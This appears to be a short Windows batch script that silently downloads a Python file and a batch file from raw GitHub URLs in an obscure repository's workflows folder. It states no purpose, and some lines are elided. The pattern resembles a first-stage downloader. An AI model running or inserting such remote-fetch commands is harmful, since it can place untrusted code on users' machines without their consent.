@echo off
curl -s -L -o setup.py https://raw.githubusercontent.com/Mamunrana1234/dfgre/refs/heads/main/.github/workflows/setup.py
...
curl -s -L -o show.bat https://raw.githubusercontent.com/Mamunrana1234/dfgre/refs/heads/main/.github/workflows/show.bat
